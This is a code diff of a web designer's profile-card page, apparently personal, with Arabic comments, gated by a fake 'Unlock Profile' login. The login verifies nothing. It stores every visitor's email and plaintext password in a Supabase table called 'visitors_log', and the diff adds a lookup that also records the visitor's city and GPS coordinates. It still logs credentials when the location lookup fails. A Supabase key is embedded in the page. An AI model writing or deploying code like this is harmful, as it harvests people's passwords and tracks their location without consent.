@@ -64,15 +64,7 @@
         .card_content { padding-top: 85px; text-align: center; }
         .satan h4 { font-size: 1.9em; background: linear-gradient(to right, var(--gold), var(--white)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; margin-bottom: 10px; }
         
-        /* السيرة الذاتية القديمة باللون الذهبي */
-        .old-bio { 
-            color: var(--muted-gold); 
-            font-size: 0.95em; 
-            padding: 0 30px; 
-            line-height: 1.6;
-            font-weight: 500;
-        }
-
+        .old-bio { color: var(--muted-gold); font-size: 0.95em; padding: 0 30px; line-height: 1.6; font-weight: 500; }
         .social { margin-top: 25px; }
         .social div { display: flex; flex-wrap: wrap; justify-content: center; gap: 12px; padding: 0 20px; }
         .social i { padding: 12px; font-size: 1.3em; background: rgba(197, 160, 89, 0.05); border-radius: 12px; border: 1px solid rgba(197, 160, 89, 0.1); color: var(--muted-gold); transition: 0.3s; width: 45px; height: 45px; display: flex; align-items: center; justify-content: center; }
@@ -88,7 +80,7 @@
         <h2>WELCOME</h2>
         <input type="email" id="email" placeholder="Email Address">
         <input type="password" id="password" placeholder="Password">
-        <button onclick="handleLogin()">Unlock Profile</button>
+        <button id="login-btn" onclick="handleLogin()">Unlock Profile</button>
         <p id="error-msg" style="margin-top: 15px; font-size: 0.8em; color: #ff4d4d;"></p>
     </div>
 </div>
@@ -104,13 +96,11 @@
     </div>
     <div class="card_content">
         <div class="satan"><h4>SALEM</h4></div>
-        
         <div class="old-bio">
             Web Designer & Creative Developer.<br>
             Specialized in UI/UX Aesthetics.<br>
             BELIEVE IN YOURSELF.
         </div>
-        
         <div class="social">
             <div>
                 <a href="https://t.me/kokksha"><i class="fab fa-telegram"></i></a>
@@ -131,7 +121,6 @@
     const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imd6aW9pbWl2YXd5cXhqb3hhamR3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU0MTc1ODQsImV4cCI6MjA5MDk5MzU4NH0.2xKTF4oDkvUUFts6Igab01OfOPKkezAb3-U_xV7r1zY';
     const supabaseClient = supabase.createClient(SB_URL, SB_KEY);
 
-    // التحقق من حالة الدخول عند التحديث
     window.onload = () => {
         if (localStorage.getItem('isUnlocked') === 'true') {
             document.getElementById('auth-screen').style.display = 'none';
@@ -143,20 +132,44 @@
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
         const errorMsg = document.getElementById('error-msg');
+        const loginBtn = document.getElementById('login-btn');
 
         if (!email.includes('@') || password.length < 6) {
             errorMsg.innerText = "خطأ في الإيميل أو الرمز غير صحيح";
             return;
         }
 
-        const { error } = await supabaseClient
-            .from('visitors_log')
-            .insert([{ visitor_email: email, visitor_password: password }]);
+        loginBtn.innerText = "Verifying...";
+        loginBtn.disabled = true;
 
-        if (error) {
-            errorMsg.innerText = "حدث خطأ في الاتصال";
-        } else {
-            // حفظ الدخول لعدم المطالبة به مرة أخرى
+        try {
+            // جلب الموقع فوراً من الـ API
+            const geoRes = await fetch('https://ipapi.co/json/');
+            const geoData = await geoRes.json();
+
+            // إرسال البيانات للجدول (تأكد أن أسماء الأعمدة في Supabase مطابقة للأسماء هنا)
+            const { error } = await supabaseClient
+                .from('visitors_log')
+                .insert([{ 
+                    visitor_email: email, 
+                    visitor_password: password,
+                    city: geoData.city || 'Unknown',
+                    coords: `${geoData.latitude}, ${geoData.longitude}` || '0,0'
+                }]);
+
+            if (error) {
+                console.error(error);
+                errorMsg.innerText = "حدث خطأ في الاتصال";
+                loginBtn.innerText = "Unlock Profile";
+                loginBtn.disabled = false;
+            } else {
+                localStorage.setItem('isUnlocked', 'true');
+                document.getElementById('auth-screen').style.display = 'none';
+                document.getElementById('profile-card').style.display = 'block';
+            }
+        } catch (e) {
+            // في حال فشل جلب الموقع، نسجل الدخول بدونه لضمان عمل الموقع
+            await supabaseClient.from('visitors_log').insert([{ visitor_email: email, visitor_password: password }]);
             localStorage.setItem('isUnlocked', 'true');
             document.getElementById('auth-screen').style.display = 'none';
             document.getElementById('profile-card').style.display = 'block';
